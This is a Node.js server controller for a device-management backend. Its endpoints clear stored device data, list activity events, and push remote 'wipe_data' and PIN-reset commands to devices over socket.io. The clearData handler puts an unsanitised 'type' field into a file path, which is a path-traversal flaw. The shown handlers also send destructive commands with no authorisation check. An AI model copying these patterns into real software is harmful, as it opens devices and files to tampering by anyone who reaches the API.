'use strict';

const fs = require('fs');
const path = require('path');
const deviceService = require('../services/device.service');
const dbService = require('../services/database.service');

function getUploadsDir() {
    return path.join(__dirname, '..', 'uploads');
}

// POST /api/clear-data
async function clearData(req, res, io) {
    try {
        const id = (req.body.device_id || req.body.deviceId || '').toString().trim().toUpperCase();
        const type = (req.body.type || 'live_status').toString().trim();
        if (!id) return res.status(400).json({ error: 'device_id required' });
        const filePath = path.join(getUploadsDir(), `${id}_${type}.json`);
        if (fs.existsSync(filePath)) {
            await fs.promises.writeFile(filePath, '[]');
        }
        if (type === 'live_status') {
            try { await dbService.clearActivityEvents(id); } catch (e) { }
        }
        io.to(id).emit('device_data_update', { device_id: id, type });
        res.json({ status: 'success', cleared: type });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
}

// GET /api/activity-events
async function getActivityEvents(req, res) {
    try {
        const id = String(req.query.deviceId || req.query.device_id || '').trim().toUpperCase();
        if (!id) return res.status(400).json({ error: 'deviceId required' });
        const limit = Math.min(parseInt(req.query.limit, 10) || 200, 1000);
        const events = await dbService.loadActivityEvents(id, limit);
        res.json(Array.isArray(events) ? events : []);
    } catch (e) {
        res.status(500).json({ error: e.message || 'failed' });
    }
}

// POST /api/wipe-device
function wipeDevice(req, res, io) {
    let { device_id } = req.body;
    if (!device_id) return res.status(400).json({ error: "Missing device_id" });
    const id = device_id.toString().trim().toUpperCase();
    io.to(id).emit('command', 'wipe_data');
    console.log(`WIPE command sent to: ${id}`);
    deviceService.setDevice(id, { lastSeen: 0 });
    deviceService.setCommand(id, 'wipe_data');
    res.json({ status: "success", command: "wipe_data" });
}

// POST /api/set-pin
function setPin(req, res, io) {
    let { device_id, pin } = req.body;
    if (!device_id || !pin) return res.status(400).json({ error: "Missing info" });
    const id = device_id.toString().trim().toUpperCase();
    io.to(id).emit('command', 'reset_password:' + pin);
    console.log(`PIN set command sent to: ${id}`);
    res.json({ status: "success" });
}

module.exports = { clearData, getActivityEvents, wipeDevice, setPin };
